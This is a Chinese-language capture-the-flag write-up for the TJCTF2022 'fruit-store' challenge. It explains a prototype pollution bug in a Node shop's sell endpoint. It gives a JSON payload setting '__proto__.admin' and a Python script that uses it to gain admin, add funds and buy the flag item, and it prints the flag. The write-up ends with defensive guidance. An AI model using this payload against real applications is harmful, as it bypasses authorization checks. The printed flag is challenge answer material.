# TJCTF2022 fruit-store

## 题目简述

商店把 flag 放在超高价商品 `grass` 的描述中，价格为 `2.5e25`。只有 `req.session.admin` 为真时，`/api/v1/money` 才允许增加余额。卖货接口会遍历用户提供的商品名与属性，并把未知或继承得到的对象直接改写，因此可以通过 `__proto__` 污染 `Object.prototype`，让所有普通 session 都继承 `admin` 属性。

## 解题过程

向卖货接口提交包含 `__proto__` 的 JSON。`fruits['__proto__']` 解析为该普通对象的原型，值本来就存在，所以代码不会创建安全副本，而是把 `admin` 写到 `Object.prototype`：

```json
{
  "__proto__": {"admin": "yes"},
  "mango": {"quantity": 1}
}
```

关键代码等价于：

```javascript
for (const [k, v] of Object.entries(value)) {
    fruits[key][k] = v;
}
```

此后 `req.session.admin` 即使没有自有属性，也会从原型链读到真值。用同一会话调用余额接口，加入足以覆盖草价的钱，再购买一份 `grass`：

```python
s.post(base + '/api/v1/sell', json={
    '__proto__': {'admin': 'yes'},
    'mango': {'quantity': 1},
})
s.post(base + '/api/v1/money', json={'money': 2.5e25 + 1})
r = s.post(base + '/api/v1/buy', json={'fruit': 'grass', 'quantity': 1})
print(r.json()['description'])
```

商品描述返回 `tjctf{h4v3_y0u_ev3r_tri3d_gr4s5_j3l1y_d4ebd9}`。

## 方法总结

问题不是负价格，而是把攻击者控制的键用于普通对象索引，并继续修改取到的继承对象。检测原型污染时要特别检查 `__proto__`、`constructor` 与 `prototype` 三类路径。应使用无原型字典、显式键白名单和自有属性检查，同时不能把授权判断建立在可能从原型链继承的属性上。
